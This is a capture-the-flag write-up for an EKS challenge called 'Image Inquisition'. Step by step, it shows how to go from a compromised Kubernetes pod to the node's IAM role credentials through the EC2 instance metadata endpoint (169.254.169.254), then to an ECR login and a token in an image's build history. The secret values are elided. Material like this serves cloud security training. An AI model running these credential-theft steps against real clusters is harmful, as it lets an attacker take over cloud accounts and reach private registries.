## Image Inquisition
Goal: Listing all the secrets in the cluster and spot the flag among them.

Permissions:
```
{
    "pods": [
        "list",
        "get"
    ]
}
```

Walkthrough:

Since we have access to list pods, we can see which pods are running. 

```bash
kubectl get pods
```

```bash
Output:

NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-876647f8   1/1     Running   0          13d
```

Now that we know the name of the pod we can describe it and retrieve the ECR image. 

```bash
kubectl describe pod accounting-pod-876647f8
```

```bash
Output:

Image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
```

If we try to list the tags of the image using crane we get a 401 Unauthorized response. 

```bash
crane ls 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c
```

```bash
Output:

Error: reading tags for 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/tags/list?n=1000: unexpected status code 401 Unauthorized: Not Authorized
```

So we need to login into the ECR repository. Normally, we can to the ECR repo using the following command. 


```bash
aws ecr get-login-password --region region | docker login --username AWS --password-stdin aws_account_id.dkr.ecr.region.amazonaws.com
```

But since docker is not installed we will be using crane to achive the same. 

```bash
crane auth login -u AWS -p $ECR_REGISTRY_PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com
```

In oorder to retrieve the ECR registry password we need to run 

```bash
aws ecr get-login-password --region us-west-1
```
```bash
Output:

Unable to locate credentials. You can configure credentials by running "aws configure".
```
This means that there are no credentials configured at the moment.  If we pay close attention to the instructions we see the following message 

```Remember: You are running inside a compromised EKS pod.```

Since the pod is running on an EC2 instance we can retrieve the metadata and look for IAM credential information we can use to configure the CLI and retireve the ECR password. 

```bash
curl http://169.254.169.254/latest/meta-data
```

```bash
Output:

ami-id
ami-launch-index
ami-manifest-path
autoscaling/
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
system
```

Next we can select and inspect what is inside the iam/ path. 

```bash
curl http://169.254.169.254/latest/meta-data/iam
```

```bash
Output:

info
security-credentials/
```

security-credentials/ should contain the information we are looking for. 

```bash 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

```bash
Output:

eks-challenge-cluster-nodegroup-NodeInstanceRole
```

```bash 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole
```

```bash
Output:

{
    "AccessKeyId":"...",

    "Expiration":"...",

    "SecretAccessKey":"...",

    "SessionToken":"..."
 }

```
Now that we have the credentials we can use environment variables to configure the AWS CLI. 

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
export AWS_DEFAULT_REGION=us-west-1
```

We can check if it was configured correctly by running the following command. 

```bash
aws sts get-caller-identity
```

```bash
Output:

{
    "UserId": "...",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/..."
}
```

Lets retrieve the ECR password 

```bash
export ECR_REGISTRY_PASSWORD=$(aws ecr get-login-password --region us-west-1)
```

```bash
echo $ECR_REGISTRY_PASSWORD
```

```bash
Output:

eyJwYXlsb2FkIjoid3d5SFZ...
```
Lets now authenticate using crane.

```bash
crane auth login -u AWS -p $ECR_REGISTRY_PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com
```
```bash
Output: 

2023/11/14 17:15:33 logged in via /home/user/.docker/config.json
```

Now that we have authenticated, we can try to list the tags available. 

```bash
crane ls 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c 
```

```bash
Output:

374f28d8-container
```

Now that we know the tag, we can look through the image's configuration using the crane config command and look for the flag (ARTIFACTORY_TOKEN). 

```bash
crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c:374f28d8-container
```

```bash
Output:

{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=... ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}
```












